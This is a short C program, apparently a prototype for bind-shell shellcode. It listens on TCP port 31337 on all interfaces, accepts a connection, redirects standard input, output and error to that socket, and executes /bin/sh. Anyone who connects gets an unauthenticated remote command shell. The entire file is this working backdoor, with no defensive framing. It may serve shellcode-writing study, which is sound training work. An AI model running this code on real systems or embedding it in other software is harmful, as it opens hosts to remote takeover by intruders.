#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
 
int main(void)
{
	int yes; 
	int sockfd; // socket file descriptor
	int clientfd; // client file descriptor
	socklen_t sin_size; // The socket length
	
	struct sockaddr_in srv_addr; // server 
	struct sockaddr_in cli_addr; // client 
 
	srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
	srv_addr.sin_port = htons(31337); // server port
	srv_addr.sin_addr.s_addr = htonl(INADDR_ANY); // listen on all addresses
 
	// Socket File Descriptor - Family Internet - TCP socket Stream
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	// bind the socket
	bind( sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr) );
	
	// listen on socket
	listen(sockfd, 0);
 
	// accept connections
	sin_size = sizeof(cli_addr);
	clientfd = accept(sockfd, (struct sockaddr *)&cli_addr, &sin_size );
	
	// redirect stdin  stdout  and stderr 
	for(yes = 0; yes <= 2; yes++)
		dup2(clientfd, yes);
 
	// Execute SHell command
	execve( "/bin/sh", NULL, NULL );
}